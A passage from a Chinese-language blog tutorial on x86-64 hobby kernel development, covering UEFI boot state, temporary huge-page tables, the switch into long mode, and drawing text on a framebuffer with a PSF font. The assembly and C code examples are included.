3）</li><li>处在保护模式下</li><li><strong>可能</strong>开启了分页，若是，则 UEFI 内存映射定义的任何内存空间都是恒等映射的（虚拟地址等于物理地址），对其他区域的映射是未定义的，可能因实现而异</li><li>选择子（selector）设为“平坦模式”（flat model）或未使用</li><li>中断开启，不过仅支持 UEFI 引导服务计时器（所有加载的设备驱动都通过“轮询”进行同步服务）</li><li>EFLAGS 中的方向标志位被清除</li><li>其他通用标志寄存器未定义</li><li>128 KB 或更多的可用栈空间</li><li>栈为 16 字节对齐，可能在页表中被标记为不可执行</li><li><code>floating-point control word</code> 被初始化为 <code>0x027F</code>（all exceptions masked, double-extended-precision, round-to-nearest）</li><li><code>Multimedia-extensions control word</code> 被初始化为 <code>0x1F80</code> (all exceptions masked, roundto-nearest, flush to zero for masked underflow)</li><li><code>CR0.EM == 0</code></li><li><code>CR0.TS == 0</code></li></ul><blockquote><p>选择子的平坦模式示意如下：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115220200.png"></p></blockquote><h3 id="③-初始化栈与临时页表"><a href="#③-初始化栈与临时页表" class="headerlink" title="③ 初始化栈与临时页表"></a>③ 初始化栈与临时页表</h3><p>我们不难看出 BIOS 启动与 UEFI 启动后的机器状态在 32 位下差别并不大，大家都在保护模式下，只是 UEFI 启动<strong>可能</strong>会额外多一个栈和页表的配置，不过我们完全可以 <em>抛弃 UEFI 帮我们预设好的页表与栈，自己从头开始初始化一个</em></p><p>首先是页表的初始化，由于现在尚未完成内存管理器的构建，因此笔者选择仅构建一个临时的页表，待到进入 64 位长模式完成内存探测与内存分配器的建立之后再重新建立一个正式的新页表，64 位模式下所用的通常是四级页表，虚拟地址有效长度为 48 位，在控制寄存器组（control registers）中的 CR3 寄存器中存放顶层页表的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115214456.png"></p><blockquote><p>页表所使用的模式由 CR4 寄存器决定，具体可以参见 Intel SDM 的 3102 页 4.1.1 Four Paging Modes</p></blockquote><p>不过启动阶段若是我们的临时页表也采用 4 级页表的结构的话，或许会需要占用过多的内存空间来保证对所有内存的映射，因为这个页表只是在内存管理器建立起来之前临时一用，因此这里我们使用 <strong>1GB 的大页</strong>，这样只需要两张页面组成的二级页表便能撑起我们初期所需的所有的内存空间，<strong>待到完成最基本的内存管理器的初始化之后再重新进行页表的动态初始化</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127203951.png"></p><p>1 GB 大页的开启需要我们进入 64 位，并在页表项中设置 <code>PS</code> 位，此外，进入 64 位模式要求我们启用<strong>物理地址扩展</strong>（Physical Address Extension），这项特性将页表项从 4 字节扩展为 8 字节，我们需要在进入 64 位之前通过设置 CR4 寄存器的 PAE 位来启用该特性，并在提前在预先准备好的二级页表中设置 <code>PS</code> 位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .boot.text32:<br>    .code32<br>    .align 0x1000<br>    .extern boot_main<br><br>    .globl _start<br><br>    _start:<br>        # turn off the interrupt temporarily,<br>        # and we should turn it on after our own IDT has been built.<br>        cli<br><br>        # check for multiboot2 header<br>        cmp $MULTIBOOT2_BOOTLOADER_MAGIC, %eax<br>        jne .loop<br><br>        # temporary stack<br>        mov     $boot_stack_top, %esp<br><br>        # set the boot information as parameters for boot_main()<br>        mov     %eax, %edi<br>        mov     %ebx, %esi<br><br>        # clear eflags<br>        pushl   $0<br>        popf<br><br>        # disable paging (UEFI may turn it on)<br>        mov     %cr0, %eax<br>        mov     $CR0_PG, %ebx<br>        not     %ebx<br>        and     %ebx, %eax<br>        mov     %eax, %cr0<br><br>        # set up page table for booting stage<br>        # it&#x27;s okay to write only 32bit here :)<br>        mov     $boot_pud, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW), %eax<br>        mov     %eax, boot_pgd<br><br>        xor     %eax, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW | PAGE_ATTR_PS), %eax<br>        movl    %eax, boot_pud<br><br>        xor     %eax, %eax<br>        mov     %eax, (boot_pgd + 4)<br>        mov     %eax, (boot_pud + 4)<br><br>        # load page table<br>        mov     $boot_pgd, %eax<br>        mov     %eax, %cr3<br><br>#......<br><br>.section .boot.data<br>    .section .boot.data:<br>    .align 0x1000<br><br>    .globl boot_stack, boot_stack_top<br><br>    #<br>    # When the system is booted under legacy BIOS, there&#x27;s no stack<br>    # So we reserve a page there as a temporary stack for booting<br>    #<br>    boot_stack:<br>        .space 0x1000<br>    boot_stack_top:<br><br>    boot_pgd:<br>        .space 0x1000<br>    boot_pud:<br>        .space 0x1000<br><br></code></pre></td></tr></table></figure><h3 id="④-进入-64-位模式"><a href="#④-进入-64-位模式" class="headerlink" title="④ 进入 64 位模式"></a>④ 进入 64 位模式</h3><p>64 位运行模式（Intel 称为 <code>IA-32e mode</code>，AMD 称为 <code>long mode</code>）是进入 64 位时代后 x64 处理器引入的<strong>新的运行模式</strong>，其有着两个子模式：</p><ul><li>兼容模式（Compatibility mode）：传统的 16&#x2F;32 位应用程序仍能正常运行，类似于 32 位保护模式，其使用 16&#x2F;32 位地址与操作数，仅能访问线性地址空间的前 4 GB，通过 PAE 可以访问更多的物理内存</li><li>纯 64 位模式（64-bit mode）：该模式下可以访问 64 位线性地址空间， <em>通常</em> 不再使用分段，通用寄存器与 SIMD 扩展寄存器从 8 个扩展至 16 个，通用寄存器扩展至 64 位，默认地址大小为 64 位，默认操作数大小为 32 位，新增的 opcode 前缀 <code>REX</code> 用以进行 64 位下的扩展访问</li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png"></p><blockquote><p>参见 Intel SDM 卷 1 Chapter 3、卷 3A Chapter 2 与 AMD64 PM 卷 1 Chapter 2、卷 2 Chapter 1</p><blockquote><p><del>翻大砖头全英手册真给👴整麻了</del></p></blockquote></blockquote><p>简而言之就是进入 64 位模式之后正常运行 64 位应用就在纯 64 位模式，但也可以通过兼容模式来像 32 位保护模式那样运行以前的 32 位应用，这两种子模式间的切换<strong>通过 CS 段选择子对应的段描述符的 L 位决定</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129171602.png" alt="AMD64 处理器运行模式切换"></p><p>我们的 64 位操作系统自然是运行在纯 64 位这一子模式下的，而 GRUB 引导进入我们的内核时我们仍处于 32 位模式下，因此我们需要编写 32 位汇编来将处理器切换到 64 位模式，具体需要进行如下工作：</p><ul><li>将 **Model Specific Register **这一寄存器组中的 <strong>Extended Feature Enable Register</strong> 寄存器的 LME 位置为 1（参见 Intel SDM 卷 3 A Chapter 2 的 2.2.1 节，Table 2-1）</li><li>配置好相应的全局段描述符表，并将 CS 段选择子对应的段描述符的 L 位置为 1</li><li>开启控制寄存器组中 CR4 寄存器的 <strong>物理地址扩展</strong>（Physical Address Extension）</li><li>开启控制寄存器组中 CR0 寄存器的 <strong>分页</strong>（Paging），这要求我们预先装载一份页表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        # enable PAE and PGE<br>        mov     %cr4, %eax<br>        or      $(CR4_PAE | CR4_PGE), %eax<br>        mov     %eax, %cr4<br><br>        # enter long mode by enabling EFER.LME<br>        mov     $0xC0000080, %ecx<br>        rdmsr<br>        or      $(1 &lt;&lt; 8), %eax<br>        wrmsr<br><br>        # enable paging<br>        mov     %cr0, %eax<br>        or      $CR0_PG, %eax<br>        mov     %eax, %cr0<br><br>        # set up GDT<br>        mov     $gdt64_ptr, %eax<br>        lgdt    0(%eax)<br><br>#......<br><br>.section .boot.data<br>    #......<br><br>    # global segment descriptor table<br>    .align 0x1000   # it should be aligned to page<br>    .globl gdt64, gdt64_ptr<br>    gdt64:<br>        .quad 0 # first one must be zero<br>    gdt64_code_segment:<br>        .quad 0x00209A0000000000 # exec/read<br>    gdt64_data_segment:<br>        .quad 0x0000920000000000 # read/write<br>    gdt64_ptr:<br>        .short gdt64_ptr - gdt64 - 1    # GDT limit<br>        .long gdt64                     # GDT Addr<br></code></pre></td></tr></table></figure><p>此时我们便来到了 64 位<strong>兼容模式</strong>，而要进入纯 64 位模式，则需要我们<strong>手动更新 CS 段选择子</strong>，这里笔者通过一个远跳转 <code>jmp</code> 指令<strong>手动指定段选择子的方式来刷新 CS 段选择子</strong>：</p><blockquote><p>除了通过 <code>jmp 选择子:目标地址</code> 的方式以外，我们也可以通过 <code>lretq</code> 指令刷新 CS 段选择子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>    pushq   $(1 &lt;&lt; SELECTOR_INDEX)<br>    pushq   $boot_main<br>    lretq<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>以及别忘了刷新数据段选择子和其他段选择子，这些选择子可以直接通过寄存器进行重新赋值，<strong>但是 CS 段选择子必须通过指令进行刷新</strong></p></blockquote><p>从 <code>boot_main()</code> 开始我们就可以进入 C 语言的世界了：）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    # reload all the segment registers<br>    mov $(2 &lt;&lt; SELECTOR_INDEX), %ax<br>    mov     %ax, %ds<br>    mov     %ax, %ss<br>    mov     %ax, %es<br>    mov     %ax, %fs<br>    mov     %ax, %gs<br><br>    # enter the 64-bit world within a long jmp<br>    jmp $(1 &lt;&lt; SELECTOR_INDEX), $boot_main<br><br>    # we shouldn&#x27;t get here...<br>.loop:<br>    hlt<br>    jmp .loop<br></code></pre></td></tr></table></figure><blockquote><h4 id="Extra-分段内存简介"><a href="#Extra-分段内存简介" class="headerlink" title="Extra. 分段内存简介"></a>Extra. 分段内存简介</h4><p>在古老的 16 位与 32 位运行模式下，x86 有一种管理内存的办法叫做<strong>分段</strong>（Segment），一个段便是一段连续内存，相应地有 cs、ds 等段寄存器用来指示不同用途的段，经过分段映射的地址称为逻辑地址（logical address）</p><p>16 位下段寄存器中直接存放段基址与段界限信息，32 位下段描述符扩展为 8 字节，存放在内存中一个名为段描述符表的结构中，GDTR 寄存器用来存放全局段描述符表的地址，相应地段寄存器中存放的变为段选择子（segment selector），指示了该段寄存器对应的段在段描述符表中的索引、权限等信息</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129183708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184644.png" alt="32 位下的段描述符"></p><p>不过分段内存模式过于鸡肋，现代操作系统通常会选择把所有段都初始化为整个内存，因此 CPU 厂商更改了设计，在 64 位下默认不使用分段特性，不过 <em>也不是完全弃用分段这一特性</em> （尾大不掉属于是）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184734.png" alt="64 位下的段描述符"></p></blockquote><h2 id="boot-tty-c：读写-frame-buffer-进行文字输出"><a href="#boot-tty-c：读写-frame-buffer-进行文字输出" class="headerlink" title="boot_tty.c：读写 frame buffer 进行文字输出"></a>boot_tty.c：读写 frame buffer 进行文字输出</h2><p>熟悉各类操作系统开发教程的小伙伴肯定知道非常经典的读写 <code>0xB8000</code> 这块内存便能在屏幕上进行字体输出， <strong>但是在 UEFI 启动下这个方法已经不在可用</strong> ，那么我们该怎么进行字体输出呢？最简单的办法自然是——<strong>把像素点直接画在屏幕上</strong></p><h3 id="①-Frame-Buffer"><a href="#①-Frame-Buffer" class="headerlink" title="① Frame Buffer"></a>① Frame Buffer</h3><p><strong>帧缓冲区</strong> （ <strong>frame buffer</strong> ）为内存&#x2F;显存中的一块自定义区域，可以简单理解为屏幕上所显示内容的缓存，显卡会定期从这块区域搬运数据到显示设备上，因此我们可以通过读写 frame buffer 的方式来在显示器的指定位置显示指定的像素点</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129185224.png"></p><p>有了 Multiboot2 规范，我们可以指示 GRUB2 帮我们准备 Frame buffer 的相关信息并传递给我们的内核，接下来我们便能通过直接读写 frame buffer 对应内存的方式来直接在屏幕上进行显示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* frame buffer info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> *framebuffer_base; <span class="hljs-comment">/* 32 bit color */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_width;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_height;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">boot_clear_screen</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; framebuffer_height; y++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>            framebuffer_base[y * framebuffer_width + x] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">boot_get_frame_buffer</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_framebuffer</span> *<span class="hljs-title">fb_info</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span> =</span> (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* find framebuffer tag */</span><br>    <span class="hljs-keyword">if</span> (tag == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (tag-&gt;type != MULTIBOOT_TAG_TYPE_END) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_FRAMEBUFFER) &#123;<br>            fb_info = (<span class="hljs-keyword">struct</span> multiboot_tag_framebuffer*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) \<br>              ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fb_info == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    framebuffer_base = (<span class="hljs-type">uint32_t</span>*) fb_info-&gt;common.framebuffer_addr;<br>    framebuffer_height = fb_info-&gt;common.framebuffer_height;<br>    framebuffer_width = fb_info-&gt;common.framebuffer_width;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-字体解析绘制"><a href="#②-字体解析绘制" class="headerlink" title="② 字体解析绘制"></a>② 字体解析绘制</h3><p>虽然我们现在可以通过直接操作 Frame buffer 来绘制图形，但是每个字体都要从零开始绘制的话未免就太麻烦了一点，因此我们选择载入现有的 <strong>PC Screen Font</strong> 格式的字体文件，从中读取相应的字体信息进行绘制</p><blockquote><p>这里字体笔者选择了 <a href="https://github.com/talamus/solarize-12x29-psf/">solarize-12x29</a>，clone 到本地后将 <code>Solarize.12x29.psf</code> 拷贝为 <code>arch/x86/boot/font.psf</code> 即可</p></blockquote><p>由于我们还没建立文件系统，因此我们需要将字体文件直接链接到内核当中，这里可以使用 <code>objcopy</code> 这一工具来将字体文件转换为可链接文件：</p><blockquote><p>需要注意的是，<strong>objcopy 会非常 sb 地把路径名也放进去</strong>，笔者暂时没有找到好的解决方案 :（</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objcopy -O elf64-x86-64 -B i386 -I binary boot/font.psf boot_font.o</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -t boot_font.o</span> <br><br>boot_font.o:     file format elf64-x86-64<br><br>SYMBOL TABLE:<br>0000000000000000 g       .data0000000000000000 _binary_boot_font_psf_start<br>0000000000007420 g       .data0000000000000000 _binary_boot_font_psf_end<br>0000000000007420 g       *ABS*0000000000000000 _binary_boot_font_psf_size<br></code></pre></td></tr></table></figure><p>现在我们来看如何解析这一格式的字体，PSF 有两版规范，由一个 header 来指示字体基本信息， header 之后便是字体的位图信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF1_FONT_MAGIC 0x0436</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf1_header</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> magic;     <span class="hljs-comment">/* magic number for identification */</span><br>    <span class="hljs-type">uint8_t</span> font_mode;  <span class="hljs-comment">/* PSF font mode */</span><br>    <span class="hljs-type">uint8_t</span> char_size;  <span class="hljs-comment">/* PSF char size */</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF2_FONT_MAGIC 0x864ab572</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> magic;             <span class="hljs-comment">/* magic number for PSF */</span><br>    <span class="hljs-type">uint32_t</span> version;           <span class="hljs-comment">/* zero */</span><br>    <span class="hljs-type">uint32_t</span> header_size;       <span class="hljs-comment">/* offset of bitmaps in file, 32 */</span><br>    <span class="hljs-type">uint32_t</span> flags;             <span class="hljs-comment">/* 0 if there&#x27;s no unicode table */</span><br>    <span class="hljs-type">uint32_t</span> glyph_nr;          <span class="hljs-comment">/* number of glyphs */</span><br>    <span class="hljs-type">uint32_t</span> bytes_per_glyph;   <span class="hljs-comment">/* size of each glyph */</span><br>    <span class="hljs-type">uint32_t</span> height;            <span class="hljs-comment">/* height in pixels */</span><br>    <span class="hljs-type">uint32_t</span> width;             <span class="hljs-comment">/* width in pixels */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>字体位图有着其固定的宽度与高度，虽然字体的宽度并不一定对齐到 8 bit，但是存储空间需要对齐到 8 bit 也就是 1 字节，因此<strong>位图数据中会有空数据填充段</strong>，以一个 12x12 的 PSF 位图为示例：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">           padding<br> Font data    |<br>+----------+ +--+<br><span class="hljs-number">000001100000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000011110000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000110011000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">001100001100</span> <span class="hljs-number">0000</span><br><span class="hljs-number">011000000110</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>由此我们可以通过如下代码来解析字体文件并在屏幕上显示文字（二代规范）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_boot_font_psf_start[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_boot_font_psf_end[];<br><br><span class="hljs-comment">/* char output info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> cursor_x, cursor_y;    <span class="hljs-comment">/* count by chars */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> max_ch_nr_x, max_ch_nr_y;<br><br><span class="hljs-comment">/* font info */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> *<span class="hljs-title">boot_font</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width, font_height;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width_bytes;<br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *glyph_table;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> bytes_per_glyph, glyph_nr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">boot_putchar_raw</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch, <span class="hljs-type">uint32_t</span> fg, <span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> *glyph = glyph_table;<br>    <span class="hljs-type">size_t</span> loc;<br><br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;\n&#x27;</span>) &#123;<br>        <span class="hljs-keyword">goto</span> new_line;<br>    &#125;<br><br>    <span class="hljs-comment">/* if char out of range, output null */</span><br>    <span class="hljs-keyword">if</span> (ch &lt; glyph_nr) &#123;<br>        glyph += ch * bytes_per_glyph;<br>    &#125;<br><br>    loc =  cursor_y * font_height * framebuffer_width;<br>    loc += cursor_x * font_width;<br><br>    <span class="hljs-comment">/* output the font to frame buffer */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_y = <span class="hljs-number">0</span>; ch_y &lt; font_height; ch_y++) &#123;<br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_x = <span class="hljs-number">0</span>; ch_x &lt; font_width; ch_x++) &#123;<br>            <span class="hljs-keyword">if</span> ((*(glyph + ch_x / <span class="hljs-number">8</span>) &amp; mask) != <span class="hljs-number">0</span>) &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = fg;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = bg;<br>            &#125;<br><br>            mask &gt;&gt;= <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (ch_x % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br>            &#125;<br>        